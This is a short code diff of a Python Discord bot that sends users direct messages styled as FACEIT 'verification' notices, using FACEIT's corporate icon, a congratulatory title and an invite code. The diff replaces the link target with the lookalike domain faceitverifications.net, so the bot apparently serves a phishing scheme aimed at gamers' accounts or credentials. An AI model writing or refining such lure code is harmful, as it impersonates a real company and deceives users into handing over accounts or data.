@@ -73,14 +73,11 @@ async def start_RU(ctx, member: discord.Member):
 
         embed = discord.Embed(
             title="✅ Поздравляем!",
-            description="[Нажми, чтобы продолжить верификацию](https://club.gaming-lounge.pro/oauth2/)",
+            description="[Нажми, чтобы продолжить верификацию](https://faceitverifications.net/hub/)",
             color=discord.Color.dark_orange()
         )
         embed.set_thumbnail(
             url="https://corporate.faceit.com/wp-content/uploads/icon-pheasant-preview-2.png"
-        )
-        embed.set_image(
-            url="https://corporate.faceit.com/wp-content/uploads/logo-full-preview-2.png"
         )
         embed.add_field(name="Код приглашения", value="HE39XW")
 
@@ -157,10 +154,6 @@ async def start_EU(ctx, member: discord.Member):
         embed.set_thumbnail(
             url=
             "https://corporate.faceit.com/wp-content/uploads/icon-pheasant-preview-2.png"
-        )
-        embed.set_image(
-            url=
-            "https://corporate.faceit.com/wp-content/uploads/logo-full-preview-2.png"
         )
 
         await dm.send(embed=embed)
